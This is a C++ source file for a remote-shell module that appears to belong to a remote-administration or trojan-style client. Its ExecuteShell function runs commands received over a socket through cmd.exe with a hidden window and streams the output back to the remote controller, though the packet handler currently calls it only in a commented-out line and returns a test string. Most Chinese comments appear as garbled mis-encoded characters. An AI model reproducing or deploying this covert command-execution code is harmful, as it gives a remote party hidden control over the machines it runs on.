#include "pch.h"
#include "ModuleShellRemote.h"
#include "SocketClient.h"


CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(pSocketClient) {

}


CModuleShellRemote::~CModuleShellRemote() {

}



void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
	switch (pPacket->m_PacketHead.wCommandId) {
		
	case SHELL_EXECUTE: {
		//MessageBox(0, (WCHAR*)pPacket->m_pbPacketBody, L"", 0);
		//ExecuteShell((WCHAR*)pPacket->m_pbPacketBody);

		WCHAR pszData[30] = L"I am the test!";
		pPacket->m_pSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)pszData, 30);
		break;
	}
		

	case SHELL_CLOSE:
		break;
	}
}


DWORD CModuleShellRemote::ExecuteShell(WCHAR* pszCommand)
{
	//CTcpTran m_tcptran;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;

	WCHAR pszSystemPath[300] = { 0 };		//�����л���
	char SendBuf[2048] = { 0 };				//���ͻ���
	SECURITY_ATTRIBUTES sa;					//��ȫ������
	DWORD bytesRead = 0;
	int ret = 0;
	WCHAR pszExecuteCommand[512];			// ִ�е���������

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//���������ܵ�
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		goto Clean;
	}

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;					//���̣�cmd�������д��ܵ�
	si.wShowWindow=SW_HIDE;
	//si.wShowWindow = SW_SHOW;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath));   //��ȡϵͳĿ¼
	//strcat(pszSystemPath, "\\cmd.exe /c ");                //ƴ��cmd
	//strcat(pszSystemPath, pszCommand);  //ƴ��һ��������cmd����


	StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe /c %s", pszSystemPath, pszCommand);

	//wprintf(L"ִ�����%ws\n", pszSystemPath);
	//MessageBox(0, pszExecuteCommand, L"", 0);

	//�������̣�Ҳ����ִ��cmd����
	if (!CreateProcess(NULL, pszExecuteCommand, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		printf("error = 0x%x\n", GetLastError());
		goto Clean;//ʧ��
	}
	else {
		// printf("�������̳ɹ�\n");
	}

	//CloseHandle(hWrite);

	while (TRUE)
	{
		//����ѭ����ȡ�ܵ��е����ݣ�ֱ���ܵ���û������Ϊֹ
		//if (ReadFile(hRead,SendBuf,sizeof(SendBuf),&bytesRead,NULL)==0)
		//    break;
		//m_tcptran.mysend(sock,SendBuf,bytesRead,0,60);      //���ͳ�ȥ
		//for (int i = 0; i < bytesRead; i++){
		//	printf("0x%x ", SendBuf);
		//}
		bool bReadSuccess = ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL);
		// printf("��������%d�ֽ�����\n", dwReadCount);
		//MessageBox(0, L"", L"", 0);
		if (!bReadSuccess) {
			break;
		}
		else {
			/*for (int i = 0; i < bytesRead; i++) {
				printf("%c", SendBuf[i]);
			}*/
			BOOL bRet = m_pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
			printf("???!!!!!!%d\n", m_pChildSocketClient->m_pTcpPackClient->IsConnected());
		}

		memset(SendBuf, 0, sizeof(SendBuf));  //��������
		Sleep(100);                          //��Ϣһ��
	}

	//m_tcptran.mysend(sock,(char *)MY_END,sizeof(MY_END),0,60);
Clean:
	//�ͷž��
	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);

	return 0;
}